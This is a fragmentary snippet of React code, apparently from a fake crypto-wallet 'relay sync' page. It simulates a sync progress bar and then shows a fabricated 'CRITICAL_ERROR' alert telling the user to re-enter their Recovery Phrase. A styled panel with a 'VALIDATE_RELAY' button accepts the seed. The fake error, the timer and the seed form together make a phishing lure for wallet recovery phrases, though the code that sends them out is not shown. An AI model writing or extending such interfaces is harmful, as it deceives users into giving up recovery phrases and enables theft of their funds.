    ...
    const i = setInterval(() => {
      ...
      if (c >= 100) {
        ...
        setTimeout(() => {
          ...
          setSyncProgress(0);
          setSeedVal("");
          alert("CRITICAL_ERROR [0x99A]: Node relay timeout. Mainnet bridge is congested. Please re-authenticate your Recovery Phrase to secure the handshake.");
          setView("menu");
        }, 1200);
      }
    }, 60);
          ...
          <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                ...
                <button disabled={!isSeedValid} onClick={handleFinalSync} style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'20px', opacity: isSeedValid ? 1 : 0.5}}>VALIDATE_RELAY</button>
              </>
            ) : (
